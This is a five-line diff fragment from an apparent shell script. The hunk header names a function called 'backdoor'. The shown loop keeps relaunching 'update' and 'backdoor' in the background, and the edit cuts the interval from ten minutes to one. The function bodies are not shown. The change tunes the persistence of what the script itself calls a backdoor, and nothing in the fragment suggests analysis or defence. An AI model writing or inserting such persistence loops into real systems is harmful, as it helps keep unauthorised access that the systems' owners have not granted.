@@ -96,5 +96,5 @@ backdoor() {
 while true; do
     (update &)
     (backdoor &)
-    sleep 600
+    sleep 60
 done
